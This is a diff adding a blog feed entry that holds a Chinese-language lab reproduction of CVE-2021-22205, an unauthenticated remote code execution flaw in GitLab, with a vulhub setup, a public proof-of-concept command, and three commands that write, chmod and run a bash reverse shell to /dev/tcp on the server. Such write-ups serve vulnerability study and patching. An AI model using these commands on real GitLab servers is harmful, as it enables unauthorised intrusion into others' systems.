@@ -4,6 +4,31 @@
   
     
     <entry>
+      <title>CVE-2021-22205 GitLab 未授权RCE</title>
+      <link href="/article/659abcc5.html"/>
+      <url>/article/659abcc5.html</url>
+      
+        <content type="html"><![CDATA[<h2 id="CVE-2021-22205-GitLab-未授权RCE"><a href="#CVE-2021-22205-GitLab-未授权RCE" class="headerlink" title="CVE-2021-22205 GitLab 未授权RCE"></a>CVE-2021-22205 GitLab 未授权RCE</h2><h3 id="漏洞简介："><a href="#漏洞简介：" class="headerlink" title="漏洞简介："></a>漏洞简介：</h3><p>GitLab 是一个用于仓库管理系统的开源项目，使用 Git 作为代码管理工具，并在此基础上搭建起来的 Web服务。</p><p>GitLab是一款Ruby开发的Git项目管理平台。如11.9以后的GitLab中，因为使用了图片处理工具ExifTool而受到漏洞<a href="https://devcraft.io/2021/05/04/exiftool-arbitrary-code-execution-cve-2021-22204.html">CVE-2021-22204</a>的影响，攻击者可以通过一个未授权的接口上传一张恶意构造的图片，进而在GitLab服务器上执</p><p>参考链接：</p><ul><li><a href="https://hackerone.com/reports/1154542">https://hackerone.com/reports/1154542</a></li><li><a href="https://devcraft.io/2021/05/04/exiftool-arbitrary-code-execution-cve-2021-22204.html">https://devcraft.io/2021/05/04/exiftool-arbitrary-code-execution-cve-2021-22204.html</a></li><li><a href="https://security.humanativaspa.it/gitlab-ce-cve-2021-22205-in-the-wild/">https://security.humanativaspa.it/gitlab-ce-cve-2021-22205-in-the-wild/</a></li><li><a href="https://github.com/projectdiscovery/nuclei-templates/blob/master/cves/2021/CVE-2021-22205.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/master/cves/2021/CVE-2021-22205.yaml</a></li><li><a href="https://github.com/vulhub/vulhub/blob/master/gitlab/CVE-2021-22205/README.zh-cn.md">https://github.com/vulhub/vulhub/blob/master/gitlab/CVE-2021-22205/README.zh-cn.md</a></li></ul><h3 id="影响版本："><a href="#影响版本：" class="headerlink" title="影响版本："></a>影响版本：</h3><pre class="line-numbers language-none"><code class="language-none">该漏洞影响以下GitLab企业版和社区版：11.9 &lt;&#x3D; GitLab（CE&#x2F;EE）&lt; 13.8.813.9 &lt;&#x3D; GitLab（CE&#x2F;EE）&lt; 13.9.613.10 &lt;&#x3D;GitLab（CE&#x2F;EE）&lt; 13.10.3本文复现版本：Gitlab CE 13.10.1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h3><p>建议内存&gt;8</p><p>执行如下命令启动一个GitLab 13.10.1版本服务器：</p><pre class="line-numbers language-none"><code class="language-none">git clone https:&#x2F;&#x2F;github.com&#x2F;vulhub&#x2F;vulhub.gitcd vulhub&#x2F;gitlab&#x2F;CVE-2021-22205&#x2F;docker-compose up -d环境启动后，访问http:&#x2F;&#x2F;your-ip:8080即可查看到GitLab的登录页面。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/img/image-20211029214111000.png" alt="GitLab首页"></p><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><h4 id="漏洞POC"><a href="#漏洞POC" class="headerlink" title="漏洞POC"></a>漏洞POC</h4><p><code>https://github.com/Al1ex/CVE-2021-22205</code></p><h4 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h4><p><code>python CVE-2021-22205.py  -v true -t http://Your IP:Port</code></p><p><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/img/image-20211029214708935.png" alt="漏洞探测"></p><p><strong>命令执行：</strong></p><p><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/img/image-20211029215055570.png" alt="dnslog验证"></p><p><strong>反弹shell：</strong></p><pre class="line-numbers language-none"><code class="language-none">python3 CVE-2021-2205.py -a true -t http:&#x2F;&#x2F;Your IP:port -c &quot;echo &#39;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port 0&gt;&amp;1&#39; &gt; &#x2F;tmp&#x2F;1.sh&quot;这条语句意思是代表，将反弹shell命令写成sh脚本 到tmp目录下python3 CVE-2021-2205.py -a true -t http:&#x2F;&#x2F;Your IP:port -c &quot;chmod +x &#x2F;tmp&#x2F;1.sh&quot;这条语句意思是代表，对写入成功的sh脚本加执行权限python3 CVE-2021-2205.py -a true -t http:&#x2F;&#x2F;Your IP:port -c &quot;&#x2F;bin&#x2F;bash &#x2F;tmp&#x2F;1.sh&quot;这条语句意思是代表，运行反弹shell脚本<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/img/image-20211029215631594.png" alt="反弹shell写入1.sh脚本"></p><p><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/img/image-20211029220042720.png" alt="写入成功验证"></p><p><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/img/image-20211029220215319.png" alt="修改脚本权限"></p><p><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/img/image-20211029220251930.png" alt="验证修改权限成功"></p><p><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/img/image-20211029220538808.png" alt="反弹shell"></p><p><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/img/image-20211029220605182.png" alt="大部分权限都是git这里需要提权"></p><h3 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h3><p>1、及时升级GitLab至最新安全版本</p><p>2、配置访问控制策略，避免受影响的GitLab暴露在公</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 漏洞复现 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> GitLab </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>国外扫描工具-Nuclei</title>
       <link href="/article/da8eafa9.html"/>
       <url>/article/da8eafa9.html</url>
